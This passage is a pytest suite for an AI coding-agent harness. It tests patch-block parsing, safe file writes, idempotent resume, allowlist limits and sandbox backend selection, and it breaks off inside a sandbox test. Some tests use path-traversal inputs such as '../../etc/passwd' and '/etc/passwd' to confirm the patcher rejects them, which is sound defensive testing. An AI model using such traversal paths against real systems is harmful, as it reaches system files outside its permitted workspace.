"""
Unit tests for the AI Agent Harness modules.
Tests cover: graph, patcher, sandbox, security, storage, lintgate, deploy, redactor, impact.
"""
import asyncio
import json
import os
import sys
import tempfile
from pathlib import Path
from typing import Any

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest


# ===========================================================================
# PATCHER TESTS
# ===========================================================================

class TestPatchBlockParser:

    def test_parse_replace_block(self):
        from harness.patcher import parse_patch_blocks, OperationType
        output = """<<<REPLACE_BLOCK>>>
file: src/main.py
search:
def old_function():
    pass
replace:
def new_function():
    return True
<<<END_REPLACE_BLOCK>>>"""
        blocks = parse_patch_blocks(output)
        assert len(blocks) == 1
        assert blocks[0].operation == OperationType.REPLACE_BLOCK
        assert blocks[0].file == "src/main.py"
        assert "old_function" in blocks[0].search
        assert "new_function" in blocks[0].replace

    def test_parse_create_file(self):
        from harness.patcher import parse_patch_blocks, OperationType
        output = """<<<CREATE_FILE>>>
file: src/new_file.py
content:
print("hello world")
<<<END_CREATE_FILE>>>"""
        blocks = parse_patch_blocks(output)
        assert len(blocks) == 1
        assert blocks[0].operation == OperationType.CREATE_FILE
        assert blocks[0].file == "src/new_file.py"
        assert "hello world" in blocks[0].content

    def test_parse_delete_block(self):
        from harness.patcher import parse_patch_blocks, OperationType
        output = """<<<DELETE_BLOCK>>>
file: src/old.py
search:
deprecated_code()
<<<END_DELETE_BLOCK>>>"""
        blocks = parse_patch_blocks(output)
        assert len(blocks) == 1
        assert blocks[0].operation == OperationType.DELETE_BLOCK
        assert "deprecated_code" in blocks[0].search

    def test_parse_insert_at_block(self):
        from harness.patcher import parse_patch_blocks, OperationType, Placement
        output = """<<<INSERT_AT_BLOCK>>>
file: src/models.py
anchor: UserModel
placement: after
content:
class AdminUser(UserModel):
    pass
<<<END_INSERT_AT_BLOCK>>>"""
        blocks = parse_patch_blocks(output)
        assert len(blocks) == 1
        assert blocks[0].operation == OperationType.INSERT_AT_BLOCK
        assert blocks[0].anchor == "UserModel"
        assert blocks[0].placement == Placement.AFTER

    def test_parse_multiple_blocks(self):
        from harness.patcher import parse_patch_blocks
        output = """<<<REPLACE_BLOCK>>>
file: a.py
search:
old
replace:
new
<<<END_REPLACE_BLOCK>>>

<<<CREATE_FILE>>>
file: b.py
content:
content
<<<END_CREATE_FILE>>>"""
        blocks = parse_patch_blocks(output)
        assert len(blocks) == 2

    def test_no_blocks_returns_empty(self):
        from harness.patcher import parse_patch_blocks
        blocks = parse_patch_blocks("just some text, no blocks here")
        assert blocks == []

    def test_empty_content_create_file_does_not_eat_next_block(self):
        # Regression: an empty-content CREATE_FILE used to extend its non-greedy
        # capture past its own END marker and swallow the next block whole.
        from harness.patcher import parse_patch_blocks, OperationType
        output = """<<<CREATE_FILE>>>
file: pkg/__init__.py
content:
<<<END_CREATE_FILE>>>

<<<CREATE_FILE>>>
file: pkg/models.py
content:
from enum import Enum
<<<END_CREATE_FILE>>>"""
        blocks = parse_patch_blocks(output)
        assert len(blocks) == 2
        assert blocks[0].operation == OperationType.CREATE_FILE
        assert blocks[0].file == "pkg/__init__.py"
        assert blocks[0].content == ""
        assert blocks[1].operation == OperationType.CREATE_FILE
        assert blocks[1].file == "pkg/models.py"
        assert blocks[1].content == "from enum import Enum"
        assert "<<<" not in blocks[0].content
        assert "<<<" not in blocks[1].content

    def test_empty_replace_block_capture(self):
        # Regression: empty replacement (delete-by-replace) must not consume the END marker.
        from harness.patcher import parse_patch_blocks, OperationType
        output = """<<<REPLACE_BLOCK>>>
file: a.py
search:
print("x")
replace:
<<<END_REPLACE_BLOCK>>>

<<<CREATE_FILE>>>
file: b.py
content:
ok
<<<END_CREATE_FILE>>>"""
        blocks = parse_patch_blocks(output)
        assert len(blocks) == 2
        assert blocks[0].operation == OperationType.REPLACE_BLOCK
        assert blocks[0].replace == ""
        assert blocks[1].file == "b.py"
        assert blocks[1].content == "ok"


class TestTextPatcher:

    @pytest.mark.asyncio
    async def test_create_file(self):
        from harness.patcher import TextPatcher
        with tempfile.TemporaryDirectory() as tmpdir:
            patcher = TextPatcher(tmpdir)
            result = await patcher.create_file("hello.py", "print('hi')")
            assert result.success
            assert os.path.isfile(os.path.join(tmpdir, "hello.py"))
            with open(os.path.join(tmpdir, "hello.py")) as f:
                assert "print('hi')" in f.read()

    @pytest.mark.asyncio
    async def test_create_file_already_exists(self):
        from harness.patcher import TextPatcher
        with tempfile.TemporaryDirectory() as tmpdir:
            patcher = TextPatcher(tmpdir)
            await patcher.create_file("hello.py", "print('hi')")
            result = await patcher.create_file("hello.py", "print('hi again')")
            assert not result.success
            assert "already exists" in result.error.lower()

    @pytest.mark.asyncio
    async def test_path_traversal_create_file_rejected(self):
        # Regression: LLM-supplied paths like "../../etc/passwd" previously
        # joined unchecked and let CREATE_FILE write outside the workspace.
        from harness.patcher import TextPatcher
        with tempfile.TemporaryDirectory() as outer:
            workspace = os.path.join(outer, "ws")
            os.makedirs(workspace)
            patcher = TextPatcher(workspace)
            result = await patcher.create_file("../escape.txt", "pwned")
            assert not result.success
            assert "path traversal" in result.error.lower()
            # No file written anywhere in the outer dir
            assert not os.path.exists(os.path.join(outer, "escape.txt"))

    @pytest.mark.asyncio
    async def test_absolute_path_create_file_rejected(self):
        from harness.patcher import TextPatcher
        with tempfile.TemporaryDirectory() as tmpdir:
            patcher = TextPatcher(tmpdir)
            result = await patcher.create_file("/tmp/escape.txt", "pwned")
            assert not result.success
            assert "path traversal" in result.error.lower()

    @pytest.mark.asyncio
    async def test_path_traversal_replace_block_rejected(self):
        from harness.patcher import TextPatcher
        with tempfile.TemporaryDirectory() as outer:
            workspace = os.path.join(outer, "ws")
            os.makedirs(workspace)
            # Create a file outside the workspace
            outside = os.path.join(outer, "secret.txt")
            with open(outside, "w") as f:
                f.write("original\n")
            patcher = TextPatcher(workspace)
            result = await patcher.replace_block("../secret.txt", "original", "pwned")
            assert not result.success
            assert "path traversal" in result.error.lower()
            # The file outside the workspace is unchanged
            with open(outside) as f:
                assert f.read() == "original\n"

    @pytest.mark.asyncio
    async def test_awrite_is_atomic_on_failure(self, monkeypatch):
        # Regression: writes used to truncate-then-write, so a crash mid-write
        # left the file empty. Now we write to a temp + os.replace; a failure
        # during write must leave the original content intact.
        from harness import patcher
        with tempfile.TemporaryDirectory() as tmpdir:
            target = os.path.join(tmpdir, "code.py")
            with open(target, "w") as f:
                f.write("ORIGINAL\n")

            # Force the write call to raise mid-way
            async def boom(self, content):
                raise RuntimeError("disk full")

            # Patch aiofiles open at the right level — easier to patch os.replace
            # to simulate a crash AFTER the temp file is written but BEFORE
            # the rename completes.
            real_replace = patcher.os.replace

            def failing_replace(src, dst):
                raise OSError("simulated crash before atomic rename")

            monkeypatch.setattr(patcher.os, "replace", failing_replace)
            try:
                with pytest.raises(OSError):
                    await patcher._awrite(target, "NEW DANGEROUS CONTENT")
            finally:
                monkeypatch.setattr(patcher.os, "replace", real_replace)

            # Original file content must be intact
            with open(target) as f:
                assert f.read() == "ORIGINAL\n"

            # No leftover temp files in the dir
            leftovers = [n for n in os.listdir(tmpdir) if n.startswith(".harness.tmp.")]
            assert leftovers == [], f"temp files leaked: {leftovers}"

    @pytest.mark.asyncio
    async def test_awrite_succeeds_with_atomic_rename(self):
        from harness import patcher
        with tempfile.TemporaryDirectory() as tmpdir:
            target = os.path.join(tmpdir, "code.py")
            with open(target, "w") as f:
                f.write("OLD\n")
            await patcher._awrite(target, "NEW\n")
            with open(target) as f:
                assert f.read() == "NEW\n"
            # No temp leftovers
            leftovers = [n for n in os.listdir(tmpdir) if n.startswith(".harness.tmp.")]
            assert leftovers == []

    def test_safe_resolve_helper(self):
        from harness.patcher import _safe_resolve
        with tempfile.TemporaryDirectory() as tmpdir:
            # Normal nested path passes
            ok = _safe_resolve(tmpdir, "sub/dir/file.py")
            assert ok.startswith(os.path.realpath(tmpdir))
            # Traversal raises
            with pytest.raises(ValueError, match="escapes workspace"):
                _safe_resolve(tmpdir, "../../etc/passwd")
            # Absolute raises
            with pytest.raises(ValueError, match="absolute path"):
                _safe_resolve(tmpdir, "/etc/passwd")
            # Empty raises
            with pytest.raises(ValueError, match="non-empty"):
                _safe_resolve(tmpdir, "")

    @pytest.mark.asyncio
    async def test_replace_block(self):
        from harness.patcher import TextPatcher
        with tempfile.TemporaryDirectory() as tmpdir:
            filepath = os.path.join(tmpdir, "test.py")
            with open(filepath, "w") as f:
                f.write("def foo():\n    return 1\n")
            patcher = TextPatcher(tmpdir)
            result = await patcher.replace_block("test.py", "return 1", "return 42")
            assert result.success
            with open(filepath) as f:
                assert "return 42" in f.read()

    @pytest.mark.asyncio
    async def test_replace_block_not_found(self):
        from harness.patcher import TextPatcher
        with tempfile.TemporaryDirectory() as tmpdir:
            filepath = os.path.join(tmpdir, "test.py")
            with open(filepath, "w") as f:
                f.write("def foo():\n    return 1\n")
            patcher = TextPatcher(tmpdir)
            result = await patcher.replace_block("test.py", "nonexistent", "replacement")
            assert not result.success

    @pytest.mark.asyncio
    async def test_replace_block_file_not_found(self):
        from harness.patcher import TextPatcher
        with tempfile.TemporaryDirectory() as tmpdir:
            patcher = TextPatcher(tmpdir)
            result = await patcher.replace_block("nonexistent.py", "a", "b")
            assert not result.success
            assert "not found" in result.error.lower()

    @pytest.mark.asyncio
    async def test_delete_block(self):
        from harness.patcher import TextPatcher
        with tempfile.TemporaryDirectory() as tmpdir:
            filepath = os.path.join(tmpdir, "test.py")
            with open(filepath, "w") as f:
                f.write("line1\nline2\nline3\n")
            patcher = TextPatcher(tmpdir)
            result = await patcher.delete_block("test.py", "line2\n")
            assert result.success
            with open(filepath) as f:
                content = f.read()
                assert "line1" in content
                assert "line2" not in content

    @pytest.mark.asyncio
    async def test_insert_at_block_after(self):
        from harness.patcher import TextPatcher, Placement
        with tempfile.TemporaryDirectory() as tmpdir:
            filepath = os.path.join(tmpdir, "test.py")
            content = "line1\ndef target_function():\n    pass\nline3\n"
            with open(filepath, "w") as f:
                f.write(content)
            patcher = TextPatcher(tmpdir)
            result = await patcher.insert_at_block("test.py", "target_function", Placement.AFTER, "    print('inserted')")
            assert result.success
            with open(filepath) as f:
                new_content = f.read()
                assert "print('inserted')" in new_content

    # ---- Resume-idempotency regressions ----

    @pytest.mark.asyncio
    async def test_create_file_idempotent_when_identical_content(self):
        # Re-running a CREATE_FILE with identical content (e.g. after a
        # crash-then-resume) must return success, not "File already exists".
        from harness.patcher import TextPatcher
        with tempfile.TemporaryDirectory() as tmpdir:
            patcher = TextPatcher(tmpdir)
            r1 = await patcher.create_file("idem.py", "print('a')")
            assert r1.success
            r2 = await patcher.create_file("idem.py", "print('a')")
            assert r2.success
            assert "no-op" in r2.message.lower() or "already at target" in r2.message.lower()
            assert r2.lines_changed == 0

    @pytest.mark.asyncio
    async def test_create_file_errors_when_content_differs(self):
        # If the existing file has DIFFERENT content, refuse — overwriting
        # would clobber whatever else put something there.
        from harness.patcher import TextPatcher
        with tempfile.TemporaryDirectory() as tmpdir:
            patcher = TextPatcher(tmpdir)
            await patcher.create_file("idem.py", "print('a')")
            r2 = await patcher.create_file("idem.py", "print('different')")
            assert not r2.success
            assert "different content" in r2.error.lower()
            # Original content untouched on disk
            with open(os.path.join(tmpdir, "idem.py")) as f:
                assert "print('a')" in f.read()

    @pytest.mark.asyncio
    async def test_replace_block_idempotent_when_already_replaced(self):
        # Search text gone but replace text already present (uniquely) →
        # the patch already ran. Report success on the re-run.
        from harness.patcher import TextPatcher
        with tempfile.TemporaryDirectory() as tmpdir:
            filepath = os.path.join(tmpdir, "test.py")
            with open(filepath, "w") as f:
                f.write("def foo():\n    return 42\n")
            patcher = TextPatcher(tmpdir)
            # Try to "replace" something that's already at target state
            result = await patcher.replace_block("test.py", "return 1", "return 42")
            assert result.success
            assert "already at target" in result.message.lower() or "no-op" in result.message.lower()
            assert result.lines_changed == 0

    @pytest.mark.asyncio
    async def test_replace_block_still_fails_when_neither_present(self):
        # When search and replace are BOTH absent the error path must remain.
        from harness.patcher import TextPatcher
        with tempfile.TemporaryDirectory() as tmpdir:
            filepath = os.path.join(tmpdir, "test.py")
            with open(filepath, "w") as f:
                f.write("def foo():\n    return 1\n")
            patcher = TextPatcher(tmpdir)
            result = await patcher.replace_block("test.py", "missing", "also_missing")
            assert not result.success
            assert "not found" in result.error.lower()

    @pytest.mark.asyncio
    async def test_delete_block_idempotent_when_already_gone(self):
        from harness.patcher import TextPatcher
        with tempfile.TemporaryDirectory() as tmpdir:
            filepath = os.path.join(tmpdir, "test.py")
            with open(filepath, "w") as f:
                f.write("line1\nline3\n")  # no "line2"
            patcher = TextPatcher(tmpdir)
            result = await patcher.delete_block("test.py", "line2\n")
            assert result.success
            assert "already deleted" in result.message.lower() or "no-op" in result.message.lower()
            assert result.lines_changed == 0
            # File untouched
            with open(filepath) as f:
                assert f.read() == "line1\nline3\n"

    @pytest.mark.asyncio
    async def test_insert_at_block_idempotent_when_already_inserted(self):
        # Re-running INSERT_AT_BLOCK with the same anchor + content must
        # not duplicate the insertion.
        from harness.patcher import TextPatcher, Placement
        with tempfile.TemporaryDirectory() as tmpdir:
            filepath = os.path.join(tmpdir, "test.py")
            with open(filepath, "w") as f:
                f.write("line1\ndef target():\n    pass\nline3\n")
            patcher = TextPatcher(tmpdir)
            r1 = await patcher.insert_at_block(
                "test.py", "target", Placement.AFTER, "    print('inserted')"
            )
            assert r1.success
            r2 = await patcher.insert_at_block(
                "test.py", "target", Placement.AFTER, "    print('inserted')"
            )
            assert r2.success
            assert "already inserted" in r2.message.lower() or "no-op" in r2.message.lower()
            assert r2.lines_changed == 0
            # Content appears exactly once, not twice
            with open(filepath) as f:
                body = f.read()
            assert body.count("print('inserted')") == 1

    @pytest.mark.asyncio
    async def test_insert_at_block_before_idempotent(self):
        from harness.patcher import TextPatcher, Placement
        with tempfile.TemporaryDirectory() as tmpdir:
            filepath = os.path.join(tmpdir, "test.py")
            with open(filepath, "w") as f:
                f.write("def target():\n    pass\n")
            patcher = TextPatcher(tmpdir)
            r1 = await patcher.insert_at_block(
                "test.py", "target", Placement.BEFORE, "# pragma: comment"
            )
            assert r1.success
            r2 = await patcher.insert_at_block(
                "test.py", "target", Placement.BEFORE, "# pragma: comment"
            )
            assert r2.success
            assert r2.lines_changed == 0
            with open(filepath) as f:
                assert f.read().count("# pragma: comment") == 1

    @pytest.mark.asyncio
    async def test_patch_batch_partial_then_resume(self):
        # End-to-end resume simulation: apply 2 of 3 CREATE_FILE patches,
        # pretend the process crashed, then re-apply all 3. With
        # idempotent CREATE_FILE the resume must succeed cleanly with
        # the already-applied files reported as no-ops.
        from harness.patcher import (
            TextPatcher, HybridPatcher, PatchBlock, OperationType,
        )
        with tempfile.TemporaryDirectory() as tmpdir:
            # First pass — partial: a.py and b.py created, c.py NOT yet.
            patcher = TextPatcher(tmpdir)
            r1 = await patcher.create_file("a.py", "x = 1")
            r2 = await patcher.create_file("b.py", "y = 2")
            assert r1.success and r2.success
            # Simulate crash here: c.py was never created in the original run.

            # Resume — full batch re-tried via HybridPatcher (the
            # production path):
            hybrid = HybridPatcher(tmpdir)
            results = await hybrid.apply_all([
                PatchBlock(operation=OperationType.CREATE_FILE, file="a.py", content="x = 1"),
                PatchBlock(operation=OperationType.CREATE_FILE, file="b.py", content="y = 2"),
                PatchBlock(operation=OperationType.CREATE_FILE, file="c.py", content="z = 3"),
            ])
            assert all(r.success for r in results), [
                r.error for r in results if not r.success
            ]
            # Two were no-ops, one was a real creation
            no_ops = [r for r in results if "no-op" in (r.message or "").lower()]
            assert len(no_ops) == 2
            # All three files exist with the expected content
            for name, body in [("a.py", "x = 1"), ("b.py", "y = 2"), ("c.py", "z = 3")]:
                with open(os.path.join(tmpdir, name)) as f:
                    assert body in f.read()

    # -------------------------------------------------------------------
    # Whitespace-tolerant replace_block fallback. Exact-byte matching is
    # brittle on small files (e.g. requirements.txt) where the LLM tends
    # to drop trailing whitespace or change CRLF/LF — the patcher must
    # land the change when the structural intent is unambiguous.
    # -------------------------------------------------------------------

    @pytest.mark.asyncio
    async def test_replace_block_whitespace_tolerant_trailing_newline(self):
        from harness.patcher import TextPatcher
        with tempfile.TemporaryDirectory() as tmpdir:
            target = os.path.join(tmpdir, "requirements.txt")
            # File ends WITHOUT a trailing newline
            with open(target, "w") as f:
                f.write("fastapi>=0.100,<1.0\nuvicorn[standard]>=0.23,<1.0\npydantic-settings>=2.0")
            patcher = TextPatcher(tmpdir)
            # LLM proposes a search WITH a trailing newline — exact match fails
            result = await patcher.replace_block(
                "requirements.txt",
                "pydantic-settings>=2.0\n",
                "pydantic-settings>=2.0\nhttpx>=0.27\n",
            )
            assert result.success, result.error
            assert "whitespace-tolerant" in (result.message or "").lower()
            with open(target) as f:
                content = f.read()
            assert "httpx>=0.27" in content
            # Original final-line newline behavior preserved (no extra newline)
            assert not content.endswith("\n\n")

    @pytest.mark.asyncio
    async def test_replace_block_whitespace_tolerant_trailing_spaces(self):
        from harness.patcher import TextPatcher
        with tempfile.TemporaryDirectory() as tmpdir:
            target = os.path.join(tmpdir, "config.txt")
            with open(target, "w") as f:
                f.write("alpha=1\nbeta=2\ngamma=3\n")
            patcher = TextPatcher(tmpdir)
            # LLM's search has trailing spaces the file doesn't have
            result = await patcher.replace_block(
                "config.txt",
                "alpha=1  \nbeta=2\t\n",
                "alpha=1\nbeta=22\n",
            )
            assert result.success, result.error
            with open(target) as f:
                content = f.read()
            assert "beta=22" in content
            assert "gamma=3" in content  # untouched line preserved

    @pytest.mark.asyncio
    async def test_replace_block_whitespace_tolerant_crlf_lf(self):
        from harness.patcher import TextPatcher
        with tempfile.TemporaryDirectory() as tmpdir:
            target = os.path.join(tmpdir, "win.txt")
            # File uses CRLF (e.g. cloned on Windows)
            with open(target, "wb") as f:
                f.write(b"alpha\r\nbeta\r\ngamma\r\n")
            patcher = TextPatcher(tmpdir)
            # LLM emits LF-only search — exact match fails
            result = await patcher.replace_block("win.txt", "beta\n", "BETA\n")
            assert result.success, result.error
            with open(target, "rb") as f:
                content = f.read()
            assert b"BETA" in content

    @pytest.mark.asyncio
    async def test_replace_block_whitespace_tolerant_ambiguous_refuses(self):
        from harness.patcher import TextPatcher
        with tempfile.TemporaryDirectory() as tmpdir:
            target = os.path.join(tmpdir, "dup.txt")
            # Two regions that both normalize to the same content
            with open(target, "w") as f:
                f.write("x = 1\n\nx = 1\n")
            patcher = TextPatcher(tmpdir)
            # Search with extra trailing whitespace — exact fails, ws-match
            # finds two regions, must refuse rather than guess
            result = await patcher.replace_block(
                "dup.txt", "x = 1  \n", "x = 2\n",
            )
            assert not result.success
            assert "2 regions" in (result.error or "")
            # File untouched
            with open(target) as f:
                assert f.read() == "x = 1\n\nx = 1\n"

    @pytest.mark.asyncio
    async def test_replace_block_exact_match_still_preferred(self):
        # Whitespace-tolerant matching must not change exact-match behavior:
        # when the bytes match, the path is identical to before the change.
        from harness.patcher import TextPatcher
        with tempfile.TemporaryDirectory() as tmpdir:
            target = os.path.join(tmpdir, "f.txt")
            with open(target, "w") as f:
                f.write("alpha\nbeta\ngamma\n")
            patcher = TextPatcher(tmpdir)
            result = await patcher.replace_block("f.txt", "beta\n", "BETA\n")
            assert result.success
            assert "whitespace-tolerant" not in (result.message or "").lower()
            with open(target) as f:
                assert f.read() == "alpha\nBETA\ngamma\n"

    @pytest.mark.asyncio
    async def test_replace_block_structural_drift_still_fails(self):
        # Whitespace tolerance must NOT silently fix structural changes —
        # an inserted/deleted blank line mid-block is a real difference the
        # LLM should re-emit, not something we paper over.
        from harness.patcher import TextPatcher
        with tempfile.TemporaryDirectory() as tmpdir:
            target = os.path.join(tmpdir, "f.txt")
            with open(target, "w") as f:
                f.write("alpha\n\nbeta\n")  # blank line between
            patcher = TextPatcher(tmpdir)
            # Search has no blank line — would silently match if we collapsed
            # blank lines. Must fail to surface the structural mismatch.
            result = await patcher.replace_block(
                "f.txt", "alpha\nbeta\n", "x\n",
            )
            assert not result.success
            assert "not found" in (result.error or "").lower()


class TestHybridPatcher:

    @pytest.mark.asyncio
    async def test_apply_patch_create(self):
        from harness.patcher import HybridPatcher, PatchBlock, OperationType
        with tempfile.TemporaryDirectory() as tmpdir:
            patcher = HybridPatcher(tmpdir)
            block = PatchBlock(
                operation=OperationType.CREATE_FILE,
                file="new.py",
                content="x = 1",
            )
            result = await patcher.apply_patch(block)
            assert result.success
            assert os.path.isfile(os.path.join(tmpdir, "new.py"))

    @pytest.mark.asyncio
    async def test_process_llm_patch_output(self):
        from harness.patcher import process_llm_patch_output
        with tempfile.TemporaryDirectory() as tmpdir:
            llm_output = """<<<CREATE_FILE>>>
file: hello.py
content:
print("hello")
<<<END_CREATE_FILE>>>"""
            results, modified = await process_llm_patch_output(llm_output, tmpdir)
            assert len(results) == 1
            assert results[0].success
            assert "hello.py" in modified

    @pytest.mark.asyncio
    async def test_process_llm_patch_output_respects_allowlist(self):
        # Regression: a SubAgentSkill could previously patch any file in
        # the workspace. With allowed_paths set, patches outside the
        # allowlist must be rejected but not crash.
        from harness.patcher import process_llm_patch_output
        with tempfile.TemporaryDirectory() as tmpdir:
            llm_output = """<<<CREATE_FILE>>>
file: src/auth/login.py
content:
def login(): pass
<<<END_CREATE_FILE>>>

<<<CREATE_FILE>>>
file: docs/secret_plans.md
content:
do something unrelated
<<<END_CREATE_FILE>>>"""
            results, modified = await process_llm_patch_output(
                llm_output, tmpdir,
                allowed_paths=["src/auth/"],
            )
            # Both blocks parsed → 2 results
            assert len(results) == 2
            # Only the auth file was actually applied
            allowed_results = [r for r in results if r.success]
            assert len(allowed_results) == 1
            assert "src/auth/login.py" in allowed_results[0].file
            # The disallowed file was rejected with a clear message
            rejected = [r for r in results if not r.success]
            assert len(rejected) == 1
            assert "allowlist" in rejected[0].error.lower()
            assert "src/auth/login.py" in modified
            assert "docs/secret_plans.md" not in modified
            # Nothing got written to disk for the rejected path
            assert not os.path.exists(os.path.join(tmpdir, "docs", "secret_plans.md"))

    @pytest.mark.asyncio
    async def test_process_llm_patch_output_no_allowlist_unrestricted(self):
        # Backward-compat: when allowed_paths is None, behaviour is unchanged.
        from harness.patcher import process_llm_patch_output
        with tempfile.TemporaryDirectory() as tmpdir:
            llm_output = """<<<CREATE_FILE>>>
file: anywhere/file.py
content:
x = 1
<<<END_CREATE_FILE>>>"""
            results, modified = await process_llm_patch_output(
                llm_output, tmpdir, allowed_paths=None,
            )
            assert results[0].success
            assert "anywhere/file.py" in modified

    @pytest.mark.asyncio
    async def test_replace_block_missing_yaml_file_clear_error(self):
        # Regression: REPLACE_BLOCK on a missing .yml file used to surface
        # a raw "[Errno 2] No such file or directory" OSError because the
        # AST path tried to read the file directly. Now it returns a clear
        # "File not found" message.
        from harness.patcher import HybridPatcher, PatchBlock, OperationType
        with tempfile.TemporaryDirectory() as tmpdir:
            patcher = HybridPatcher(tmpdir)
            block = PatchBlock(
                operation=OperationType.REPLACE_BLOCK,
                file=".github/workflows/test.yml",
                search="name: test",
                replace="name: ci",
            )
            result = await patcher.apply_patch(block)
            assert not result.success
            assert "not found" in result.error.lower()
            assert "errno" not in result.error.lower()

    @pytest.mark.asyncio
    async def test_replace_block_missing_file_with_empty_search_degrades_to_create(self):
        # Regression: when the LLM emits REPLACE_BLOCK with an empty search
        # against a non-existent file, that's a classic "should have used
        # CREATE_FILE" mistake. The patcher now silently degrades instead
        # of failing the repair round.
        from harness.patcher import HybridPatcher, PatchBlock, OperationType
        with tempfile.TemporaryDirectory() as tmpdir:
            patcher = HybridPatcher(tmpdir)
            block = PatchBlock(
                operation=OperationType.REPLACE_BLOCK,
                file=".github/workflows/test.yml",
                search="",
                replace="name: ci\non: [push]\n",
            )
            result = await patcher.apply_patch(block)
            assert result.success
            new_path = os.path.join(tmpdir, ".github/workflows/test.yml")
            assert os.path.isfile(new_path)
            with open(new_path) as f:
                assert "name: ci" in f.read()


# ===========================================================================
# TREE-SITTER PATCHER TESTS
# ===========================================================================
# The TestHybridPatcher class above only exercises text-mode operations. These
# tests lock in the AST path: confirm HybridPatcher routes known languages to
# the tree-sitter overlay (not the text fallback), that the init log fires,
# and that unknown extensions / CREATE_FILE correctly bypass the AST path.
# Without these, a future regression that broke tree-sitter would silently
# drop every patch to the regex text path and every other test would pass.

class TestTreeSitterPatcher:

    def test_hybrid_patcher_init_loads_ast_overlay(self, tmp_path, caplog):
        # The "[patcher:hybrid] Tree-sitter AST patcher initialized" line is
        # the operator's only signal that the AST overlay loaded. Lock it
        # in so a silent ImportError regression (leaving _ast_patcher=None)
        # cannot pass review.
        import logging
        from harness.patcher import HybridPatcher
        with caplog.at_level(logging.INFO, logger="harness.patcher"):
            patcher = HybridPatcher(str(tmp_path))
        assert patcher._ast_patcher is not None, (
            "Tree-sitter overlay failed to load. Reinstall "
            "tree-sitter-language-pack (declared in pyproject.toml)."
        )
        messages = " ".join(r.message for r in caplog.records)
        assert "Tree-sitter AST patcher initialized" in messages

    def test_ast_path_selected_for_python(self, tmp_path):
        # _select_patcher must return the AST overlay (not the text
        # fallback) for files whose extension is registered in
        # patcher.LANGUAGE_MAP. Identity comparison — the AST patcher is
        # a distinct object from the text patcher.
        from harness.patcher import HybridPatcher
        patcher = HybridPatcher(str(tmp_path))
        if patcher._ast_patcher is None:
            import pytest
            pytest.skip("tree-sitter not loaded; covered by init test")
        selected = patcher._select_patcher("module.py")
        assert selected is patcher._ast_patcher

    def test_ast_path_selected_for_rust(self, tmp_path):
        from harness.patcher import HybridPatcher
        patcher = HybridPatcher(str(tmp_path))
        if patcher._ast_patcher is None:
            import pytest
            pytest.skip("tree-sitter not loaded; covered by init test")
        selected = patcher._select_patcher("lib.rs")
        assert selected is patcher._ast_patcher

    def test_ast_path_selected_for_typescript(self, tmp_path):
        from harness.patcher import HybridPatcher
        patcher = HybridPatcher(str(tmp_path))
        if patcher._ast_patcher is None:
            import pytest
            pytest.skip("tree-sitter not loaded; covered by init test")
        selected = patcher._select_patcher("app.ts")
        assert selected is patcher._ast_patcher

    def test_unknown_extension_falls_back_to_text(self, tmp_path):
        # Unregistered extensions must route to the text patcher even
        # when the AST overlay is loaded — the AST path has no parser
        # for them.
        from harness.patcher import HybridPatcher
        patcher = HybridPatcher(str(tmp_path))
        selected = patcher._select_patcher("config.unknownext")
        assert selected is patcher._text_patcher

    def test_create_file_uses_text_path_via_apply(self, tmp_path):
        # CREATE_FILE doesn't benefit from AST awareness — there's no
        # existing structure to parse. Regression check: the file lands
        # on disk regardless of which patcher executes it.
        import asyncio
        from harness.patcher import HybridPatcher, PatchBlock, OperationType
        patcher = HybridPatcher(str(tmp_path))
        block = PatchBlock(
            operation=OperationType.CREATE_FILE,
            file="new.py",
            content="x = 1\n",
        )
        result = asyncio.run(patcher.apply_patch(block))
        assert result.success
        assert os.path.isfile(os.path.join(str(tmp_path), "new.py"))

    @pytest.mark.asyncio
    async def test_replace_block_lands_through_ast_path(self, tmp_path):
        # End-to-end: write a real Python file, REPLACE_BLOCK against it,
        # confirm the replacement landed AND that _select_patcher routes
        # this file to the AST overlay (so we know we're testing the AST
        # path, not the text fallback under the same API).
        from harness.patcher import HybridPatcher, PatchBlock, OperationType
        src_path = tmp_path / "mod.py"
        src_path.write_text("def foo():\n    return 1\n", encoding="utf-8")
        patcher = HybridPatcher(str(tmp_path))
        if patcher._ast_patcher is None:
            import pytest
            pytest.skip("tree-sitter not loaded; covered by init test")
        # Sanity: this file's extension is AST-registered.
        assert patcher._select_patcher("mod.py") is patcher._ast_patcher
        block = PatchBlock(
            operation=OperationType.REPLACE_BLOCK,
            file="mod.py",
            search="def foo():\n    return 1",
            replace="def foo():\n    return 42",
        )
        result = await patcher.apply_patch(block)
        assert result.success, result.error
        assert "return 42" in src_path.read_text(encoding="utf-8")


# ===========================================================================
# SANDBOX TESTS
# ===========================================================================

class TestSandboxBackend:

    def test_create_backend_bare(self):
        from harness.sandbox import create_backend, BareBackend
        backend = create_backend("bare")
        assert isinstance(backend, BareBackend)
        assert backend.name == "bare"

    def test_create_backend_auto(self):
        from harness.sandbox import create_backend
        backend = create_backend("auto")
        assert backend is not None
        assert backend.name.startswith(("unshare", "docker", "bare"))

    def test_create_backend_unknown(self):
        from harness.sandbox import create_backend
        with pytest.raises(ValueError):
            create_backend("nonexistent")

    def test_auto_detect_refuses_bare_without_optin(self, monkeypatch):
        # Regression: silent fallback to bare (zero isolation) was a security
        # hole. With Docker + unshare disabled and no env-var opt-in,
        # auto-detect must raise rather than expose the host.
        from harness.sandbox import _auto_detect_backend, DockerBackend, UnshareBackend
        monkeypatch.setattr(DockerBackend, "is_available", lambda self: False)
        monkeypatch.setattr(UnshareBackend, "is_available", lambda self: False)
        monkeypatch.delenv("HARNESS_ALLOW_UNSAFE_SANDBOX", raising=False)
        with pytest.raises(RuntimeError, match="HARNESS_ALLOW_UNSAFE_SANDBOX"):
            _auto_detect_backend()

    def test_auto_detect_uses_bare_with_explicit_optin(self, monkeypatch):
        from harness.sandbox import _auto_detect_backend, DockerBackend, UnshareBackend, BareBackend
        monkeypatch.setattr(DockerBackend, "is_available", lambda self: False)
        monkeypatch.setattr(UnshareBackend, "is_available", lambda self: False)
        monkeypatch.setenv("HARNESS_ALLOW_UNSAFE_SANDBOX", "true")
        backend = _auto_detect_backend()
        assert isinstance(backend, BareBackend)

    def test_explicit_bare_backend_still_works(self):
        # The opt-in gate only applies to auto-detection. Users who explicitly
        # request "bare" via config get it without the env var — they typed
        # the name themselves.
        from harness.sandbox import create_backend, BareBackend
        backend = create_backend("bare")
        assert isinstance(backend, BareBackend)

    @pytest.mark.asyncio
    async def test_disk_log_streamer_surfaces_truncation(self):
        # Regression: log overflow was silently dropped; downstream had no way
        # to know diagnostics might be incomplete.
